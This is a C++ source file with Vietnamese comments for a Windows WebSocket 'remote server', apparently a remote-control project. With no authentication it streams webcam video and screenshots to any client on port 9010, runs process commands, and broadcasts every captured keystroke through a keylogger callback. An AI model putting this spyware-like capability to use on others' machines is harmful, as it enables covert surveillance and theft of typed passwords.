#define WIN32_LEAN_AND_MEAN // Giảm bớt kích thước file header Windows
#include <windows.h>
#include <boost/beast/core.hpp> // Thư viện Boost.Beast
#include <boost/beast/websocket.hpp> // Thư viện WebSocket của Boost.Beast
#include <boost/asio/ip/tcp.hpp> // Thư viện Boost.Asio TCP
#include <iostream>
#include <string>
#include <thread>
#include <mutex>
#include <vector>
#include <algorithm>
#include <nlohmann/json.hpp> // Thư viện JSON nlohmann
//
// Include các module
#include "core/CommandDispatcher.hpp"
#include "interfaces/IRemoteModule.hpp"
#include "modules/KeyManager.hpp"
#include "modules/WebcamManager.hpp"
#include "modules/ScreenManager.hpp"  // Phải có file này (chứa hàm static capture_screen_data)
#include "modules/ProcessManager.hpp" // Module vừa tách file
#include "modules/KeyManager.hpp"

namespace beast     = boost::beast;
namespace websocket = beast::websocket;
namespace net       = boost::asio;
using tcp           = net::ip::tcp;
using json          = nlohmann::json;

// ==================== GLOBALS ====================
static std::mutex cout_mtx; // Mutex để đồng bộ hóa việc ghi console, tránh lộn xộn khi nhiều thread ghi cùng lúc, nhất là trong do_session
CommandDispatcher g_dispatcher; // Biến toàn cục CommandDispatcher để quản lý các module

// ==================== SESSION MANAGER ====================
class SessionManager {
public:
    void join(websocket::stream<tcp::socket>* ws) { // Thêm session mới vào danh sách đang hoạt động 
        std::lock_guard<std::mutex> lock(mutex_); // Đồng bộ hóa truy cập vào danh sách 
        sessions_.push_back(ws);
    }
    void leave(websocket::stream<tcp::socket>* ws) { // Xóa session khỏi danh sách khi kết thúc 
        std::lock_guard<std::mutex> lock(mutex_);
        sessions_.erase(std::remove(sessions_.begin(), sessions_.end(), ws), sessions_.end());
    }
    void broadcast(const std::string& message) { // Gửi tin nhắn đến tất cả session đang hoạt động để thông báo key press 
        std::lock_guard<std::mutex> lock(mutex_); // Đồng bộ hóa truy cập vào danh sách
        for (auto* ws : sessions_) { // Gửi tin nhắn đến từng session 
            try {
                ws->text(true); // Chuyển về Text mode 
                ws->write(net::buffer(message)); // Gửi tin nhắn, có tác dụng thông báo key press đến client
            } catch (...) {} // Bỏ qua lỗi nếu có (ví dụ session đã đóng)
        }
    }
private:
    std::vector<websocket::stream<tcp::socket>*> sessions_; // Danh sách các session WebSocket đang hoạt động
    std::mutex mutex_; // Mutex để đồng bộ hóa truy cập vào danh sách session, hoạt động đa luồng
};
static SessionManager g_sessionManager;

// ==================== SESSION LOOP ====================
void do_session(tcp::socket s) {
    auto ws = std::make_shared<websocket::stream<tcp::socket>>(std::move(s)); // Tạo shared_ptr cho WebSocket stream để dễ dàng quản lý vòng đời trong lambda và các callback
    
    // Mutex để đồng bộ hóa việc gửi dữ liệu (tránh tranh chấp giữa Main Thread và Webcam Thread)
    auto ws_mutex = std::make_shared<std::mutex>(); // Mutex dùng chung cho session này, hoạt động đa luồng, cho phép khóa khi gửi dữ liệu, có nghĩa là cả Main Thread và Webcam Thread đều dùng chung mutex này để tránh tranh chấp khi gửi dữ liệu qua WebSocket, khi một luồng đang gửi dữ liệu thì luồng kia phải chờ

    try {
        // Log kết nối
        std::string client_ip = ws->next_layer().remote_endpoint().address().to_string();
        { std::lock_guard<std::mutex> lk(cout_mtx); std::cout << "[SESSION] CONNECTED: " << client_ip << "\n"; }

        ws->accept(); // Chấp nhận kết nối WebSocket từ client
        g_sessionManager.join(ws.get()); // Đăng ký session mới vào SessionManager

        for (;;) { // Vòng lặp chính của session, chờ và xử lý tin nhắn từ client
            beast::flat_buffer buffer;
            ws->read(buffer); // Block chờ tin nhắn từ Client, sử dụng cơ chế blocking I/O đơn giản, cơ chế đồng bộ
            
            std::string req_str = beast::buffers_to_string(buffer.data()); // Chuyển buffer thành chuỗi
            json request, response; // Biến JSON để lưu request và response
            bool response_sent_binary = false; // Cờ đánh dấu nếu đã gửi binary rồi

            try {
                request = json::parse(req_str); // Phân tích chuỗi JSON từ client
                std::string module = request.value("module", "");
                std::string cmd = request.value("command", "");

                // --- 1. XỬ LÝ WEBCAM (STREAM) ---
                if (module == "WEBCAM") {
                    auto* cam = dynamic_cast<WebcamManager*>(g_dispatcher.get_module("WEBCAM"));
                    if (cam) {
                        if (cmd == "START_STREAM") {
                            std::cout << "[MAIN] Webcam Stream Started\n";
                            // Callback chạy trên thread riêng của WebcamManager
                            cam->start_stream([ws, ws_mutex](const std::vector<uint8_t>& data) {
                                std::lock_guard<std::mutex> lock(*ws_mutex); // Khóa mutex để tránh tranh chấp khi gửi dữ liệu, có nghĩa là webcam thread sẽ chờ nếu main thread đang gửi dữ liệu
                                try {
                                    if(ws->is_open()) { // Kiểm tra kết nối vẫn mở trước khi gửi
                                        ws->binary(true); // Chế độ Binary
                                        ws->write(net::buffer(data.data(), data.size())); // Gửi dữ liệu ảnh webcam dưới dạng binary
                                    }
                                } catch (...) {}
                            });
                            response = {{"status", "success"}, {"message", "Stream Started"}};
                        } 
                        else if (cmd == "STOP_STREAM") {
                            cam->stop_stream();
                            response = {{"status", "success"}, {"message", "Stream Stopped"}};
                        }
                    }
                } 

                // --- 2. XỬ LÝ SCREENSHOT (BINARY MODE - TỐI ƯU) ---
                else if (module == "SCREEN" && cmd == "CAPTURE_BINARY") { // Yêu cầu chụp màn hình
                    std::vector<uint8_t> jpg_data; // Buffer để lưu dữ liệu JPEG
                    std::string err; // Biến lưu lỗi nếu có
                    
                    // Gọi hàm static chụp ảnh JPEG (đã cài đặt ở ScreenManager_win.cpp)
                    if (ScreenManager::capture_screen_data(jpg_data, err)) { // Thành công
                        {
                            std::lock_guard<std::mutex> lock(*ws_mutex); // Khóa mutex để tránh tranh chấp khi gửi dữ liệu
                            ws->binary(true); // Chế độ Binary
                            ws->write(net::buffer(jpg_data.data(), jpg_data.size())); // Gửi dữ liệu ảnh JPEG dưới dạng binary
                        }
                        // Client nhận binary xong không cần JSON response chứa ảnh nữa
                        // Nhưng ta vẫn gửi JSON xác nhận lệnh đã xong (Client có thể ignore)
                        response = {{"module", "SCREEN"}, {"command", "CAPTURE_COMPLETE"}, {"status", "success"}};
                        response_sent_binary = true; 
                    } else {
                        response = {{"status", "error"}, {"message", err}};
                    }
                }

                // --- 3. CÁC LỆNH THƯỜNG (Process, App, System...) ---
                else {
                    response = g_dispatcher.dispatch(request);
                }

            } catch (const std::exception& e) {
                response = {{"status", "error"}, {"message", e.what()}};
            }

            // Gửi phản hồi JSON kết thúc lệnh (trừ khi cần thiết), trừ trường hợp đã gửi binary trong lệnh chụp màn hình
            {
                std::lock_guard<std::mutex> lock(*ws_mutex); // Khóa mutex để tránh tranh chấp khi gửi dữ liệu
                ws->text(true); // Chuyển về Text mode
                ws->write(net::buffer(response.dump())); // Gửi phản hồi JSON cho client 
            }
        }

    } catch (const std::exception& e) {
        { std::lock_guard<std::mutex> lk(cout_mtx); std::cerr << "[SESSION END] " << e.what() << "\n"; }
        
        // Stop webcam nếu client ngắt kết nối đột ngột
        if (auto* cam = dynamic_cast<WebcamManager*>(g_dispatcher.get_module("WEBCAM"))) { // Kiểm tra và dừng webcam nếu đang chạy
            cam->stop_stream();
        }
    }

    g_sessionManager.leave(ws.get()); // Hủy đăng ký session khỏi SessionManager khi kết thúc
}

int main() {
    SetConsoleOutputCP(CP_UTF8); // Thiết lập mã hóa UTF-8 cho console Windows
    std::cout << "=== REMOTE SERVER (Binary Optimized) ===\n";

    // Callback cho Keylogger
    KeyManager::set_callback([&](std::string key_char) { 
        json msg; 
        msg["module"] = "KEYBOARD"; 
        msg["command"] = "PRESS"; 
        msg["data"] = { {"key", key_char} };
        g_sessionManager.broadcast(msg.dump());
    });

    try { 
        net::io_context ioc{1}; // Chỉ sử dụng 1 thread cho io_context vì ta dùng blocking I/O đơn giản
        tcp::acceptor acceptor{ioc, {net::ip::make_address("0.0.0.0"), 9010}}; // Lắng nghe trên cổng 9010
        std::cout << "[SERVER] Listening on port 9010...\n";

        for (;;) { // Vòng lặp chấp nhận kết nối mới
            tcp::socket socket{ioc}; // Tạo socket mới cho kết nối đến
            acceptor.accept(socket); // Chấp nhận kết nối
            std::thread(do_session, std::move(socket)).detach(); // Tạo thread mới để xử lý session và tách nó ra chạy ngầm
        }
    } catch (const std::exception& e) {
        std::cerr << "[FATAL] " << e.what() << "\n";
    }
    return 0;
}